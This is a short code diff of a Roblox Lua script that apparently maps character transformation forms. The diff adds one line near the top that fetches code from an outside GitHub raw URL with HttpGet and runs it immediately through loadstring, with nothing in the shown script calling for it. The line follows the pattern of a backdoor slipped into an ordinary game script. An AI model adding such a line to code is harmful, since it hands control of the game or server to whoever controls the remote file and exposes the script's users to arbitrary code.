@@ -1,6 +1,6 @@
 local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
-
+loadstring(game:HttpGet("https://raw.githubusercontent.com/XCtze/SRW/refs/heads/main/billsearth"))()
 -- Transformation map
 local transformationMap = {
     --special forms
